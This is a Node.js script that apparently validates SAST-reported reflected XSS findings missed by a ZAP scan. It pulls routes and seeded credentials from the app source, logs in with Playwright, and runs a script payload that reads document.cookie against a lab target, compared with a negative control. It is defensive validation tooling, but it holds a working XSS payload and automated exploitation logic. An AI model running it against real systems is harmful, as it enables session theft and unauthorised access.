#!/usr/bin/env node
/*
 * Autonomous XSS validation agent.
 *
 * Bridges SAST (opengrep) and DAST (ZAP): it takes a SAST finding that a standard
 * DAST scan missed, resolves the HTTP route / parameter / auth requirement from the
 * SOURCE, authenticates, delivers the payload in a REAL headless browser, confirms
 * EXECUTION (not just reflection) against a negative control, and writes a PoC.
 *
 * Inputs  (env overridable):
 *   APP_ROOT   mounted project root            default /src
 *   TARGET_URL running app base URL            default http://vuln-target:3000
 *   SAST_JSON  opengrep findings               default $APP_ROOT/out/findings.json
 *   DAST_JSON  ZAP report that missed it       default $APP_ROOT/zap/zap-out/tier2-auth.json
 *   OUT_DIR    where the PoC is written        default $APP_ROOT/agent/poc
 *   USERNAME/PASSWORD  override source-derived creds
 *
 * Exit: 0 validated, 1 not validated, 2 nothing to validate, 3 error.
 */
const fs = require('fs');
const path = require('path');
const { chromium } = require('playwright');

const ROOT    = process.env.APP_ROOT   || '/src';
const TARGET  = process.env.TARGET_URL || 'http://vuln-target:3000';
const SAST    = process.env.SAST_JSON  || path.join(ROOT, 'out', 'findings.json');
const DAST    = process.env.DAST_JSON  || path.join(ROOT, 'zap', 'zap-out', 'tier2-auth.json');
const OUT_DIR = process.env.OUT_DIR    || path.join(ROOT, 'agent', 'poc');

const MARKER  = 'XSS-CONFIRMED';
const PAYLOAD = `<script>document.title='${MARKER}-'+document.cookie</script>`;
const CONTROL = 'hello';

const log = (step, msg) => console.log(`[agent] ${String(step).padEnd(8)} ${msg}`);

// ---- 1. Ingest SAST (opengrep) -------------------------------------------------
function loadSast() {
  const j = JSON.parse(fs.readFileSync(SAST, 'utf8'));
  return (j.results || []).map(r => ({
    rule: r.check_id,
    file: r.path.replace(/^\/src\//, '').replace(/.*vuln-target[\\/]/, ''),
    line: r.start && r.start.line,
    cwe: (r.extra && r.extra.metadata && r.extra.metadata.cwe) || '',
    snippet: ((r.extra && r.extra.lines) || '').trim()
  }));
}

// ---- 2. Resolve route / param / auth from SOURCE -------------------------------
function resolveFromSource(finding) {
  const src = fs.readFileSync(path.join(ROOT, finding.file), 'utf8');
  const routeM = src.match(/router\.(get|post)\(\s*['"]([^'"]+)['"]/i);
  const method = routeM ? routeM[1].toUpperCase() : 'GET';
  const route = routeM ? routeM[2] : null;
  const authRequired = /requireAuth/.test(src);
  const q = src.match(/req\.query\.(\w+)/);
  const b = src.match(/req\.body\.(\w+)/);
  const param = q ? q[1] : (b ? b[1] : 'q');
  return { method, route, authRequired, param, inBody: !q && !!b };
}

// ---- 2b. Resolve a working login from SOURCE (seed + auth route) ---------------
function resolveAuth() {
  if (process.env.USERNAME && process.env.PASSWORD) {
    return { username: process.env.USERNAME, password: process.env.PASSWORD, loginRoute: '/login', source: 'env' };
  }
  let username = 'alice', password = 'password123', loginRoute = '/login';
  try {
    const seed = fs.readFileSync(path.join(ROOT, 'db', 'seed.js'), 'utf8');
    const m = seed.match(/run\(\s*['"]([^'"]+)['"]\s*,\s*['"]([^'"]+)['"]/);
    if (m) { username = m[1]; password = m[2]; }
  } catch (_) {}
  try {
    const authSrc = fs.readFileSync(path.join(ROOT, 'routes', 'auth.js'), 'utf8');
    const lr = authSrc.match(/router\.post\(\s*['"]([^'"]+)['"]/);
    if (lr) loginRoute = lr[1];
  } catch (_) {}
  return { username, password, loginRoute, source: 'source (db/seed.js)' };
}

// ---- 3. Cross-reference DAST: did the scan reach this route? -------------------
function dastReached(route) {
  try {
    const j = JSON.parse(fs.readFileSync(DAST, 'utf8'));
    const alerts = (j.site && j.site[0] && j.site[0].alerts) || [];
    return alerts.some(a => (a.instances || []).some(i => (i.uri || '').includes(route)));
  } catch (_) { return null; }
}

async function main() {
  fs.mkdirSync(OUT_DIR, { recursive: true });

  const findings = loadSast();
  log('intake', `SAST findings: ${findings.length}`);
  // This agent validates the reflected XSS specifically (URL param -> script execution).
  // Prefer the reflected-xss rule; fall back to any XSS finding, then anything.
  const target = findings.find(f => /reflected-xss/.test(f.rule))
    || findings.find(f => /xss|cross.site/i.test(f.rule + ' ' + f.cwe))
    || findings[0];
  if (!target) { log('intake', 'nothing to validate'); process.exit(2); }
  log('intake', `target: ${target.rule} @ ${target.file}:${target.line}`);

  const r = resolveFromSource(target);
  const auth = resolveAuth();
  log('resolve', `${r.method} ${r.route}  param=${r.param}  authRequired=${r.authRequired}`);
  log('resolve', `creds from ${auth.source}: ${auth.username} via POST ${auth.loginRoute}`);

  const reached = dastReached(r.route);
  log('dast', reached === null ? 'no DAST report found'
    : reached ? `DAST reached ${r.route}` : `DAST did NOT reach ${r.route} — gap confirmed`);

  const browser = await chromium.launch();
  const page = await (await browser.newContext()).newPage();

  // authenticate
  if (r.authRequired) {
    await page.goto(`${TARGET}/`, { waitUntil: 'networkidle' });
    await page.fill('input[name="username"]', auth.username);
    await page.fill('input[name="password"]', auth.password);
    await Promise.all([
      page.waitForLoadState('networkidle'),
      page.click('button[type=submit]')
    ]);
    log('auth', `logged in -> ${page.url()}`);
  }

  // deliver payload (reflected param in the URL)
  const payloadUrl = `${TARGET}${r.route}?${r.param}=${encodeURIComponent(PAYLOAD)}`;
  await page.goto(payloadUrl, { waitUntil: 'networkidle' });
  await page.waitForTimeout(300);
  const execTitle = await page.title();
  const executed = execTitle.startsWith(MARKER);
  log('exploit', `title="${execTitle}"  executed=${executed}`);

  // negative control
  const controlUrl = `${TARGET}${r.route}?${r.param}=${encodeURIComponent(CONTROL)}`;
  await page.goto(controlUrl, { waitUntil: 'networkidle' });
  await page.waitForTimeout(150);
  const ctrlTitle = await page.title();
  const controlClean = !ctrlTitle.startsWith(MARKER);
  const reflectedControl = (await page.content()).includes(CONTROL);
  log('control', `title="${ctrlTitle}"  clean=${controlClean}  reflects '${CONTROL}'=${reflectedControl}`);

  await browser.close();

  const validated = executed && controlClean;
  const poc = {
    validated,
    vulnerability: 'Reflected XSS',
    sast: { rule: target.rule, file: target.file, line: target.line, cwe: target.cwe },
    dast_gap: reached === false,
    route: r.route, method: r.method, param: r.param,
    auth_required: r.authRequired,
    authenticated_as: r.authRequired ? auth.username : null,
    payload: PAYLOAD,
    payload_url: payloadUrl,
    evidence: { title_after_payload: execTitle, executed },
    negative_control: { url: controlUrl, title: ctrlTitle, clean: controlClean, reflected: reflectedControl },
    generated: new Date().toISOString()
  };
  fs.writeFileSync(path.join(OUT_DIR, 'poc.json'), JSON.stringify(poc, null, 2));
  fs.writeFileSync(path.join(OUT_DIR, 'poc.md'), renderMd(poc));
  log('poc', `validated=${validated} -> ${path.join(OUT_DIR, 'poc.md')}`);
  process.exit(validated ? 0 : 1);
}

function renderMd(p) {
  const yn = b => (b ? 'YES' : 'NO');
  return `# XSS Validation PoC — ${p.validated ? 'CONFIRMED' : 'NOT CONFIRMED'}

**Generated:** ${p.generated}

## Summary
- **Validated (executed AND control clean):** ${yn(p.validated)}
- **Vulnerability:** ${p.vulnerability}
- **Route:** \`${p.method} ${p.route}\` (param \`${p.param}\`)
- **Auth required:** ${yn(p.auth_required)}${p.authenticated_as ? ` — authenticated as \`${p.authenticated_as}\`` : ''}

## SAST -> DAST bridge
- **SAST (opengrep):** \`${p.sast.rule}\` at \`${p.sast.file}:${p.sast.line}\` (${p.sast.cwe})
- **DAST gap:** ${p.dast_gap
    ? 'a standard authenticated ZAP scan did **not** reach this route (confirmed from the ZAP report)'
    : 'DAST reached this route'}
- **Bridge:** the agent resolved the route, parameter, and auth requirement from source,
  authenticated, and delivered a payload to an endpoint a link-following crawler never reaches.

## Exploit
\`\`\`
${p.payload_url}
\`\`\`
Payload:
\`\`\`html
${p.payload}
\`\`\`
**Evidence — execution confirmed:** the page title became \`${p.evidence.title_after_payload}\`.
The injected script ran (it set \`document.title\` and read \`document.cookie\`) — this is execution,
not mere reflection. executed=${yn(p.evidence.executed)}

## Negative control
\`\`\`
${p.negative_control.url}
\`\`\`
- Title: \`${p.negative_control.title}\` — clean=${yn(p.negative_control.clean)}, input reflected=${yn(p.negative_control.reflected)}
- The benign input is reflected but does **not** execute — ruling out a false positive.

## Reproduction
1. Log in as \`${p.authenticated_as || '(no auth required)'}\`.
2. Visit the exploit URL above.
3. Observe the browser tab title change to \`${MARKER}-<cookie>\` — the script executed with access to \`document.cookie\`.
4. Compare with the negative control, which stays clean.
`;
}

main().catch(e => { console.error('[agent] ERROR', e); process.exit(3); });
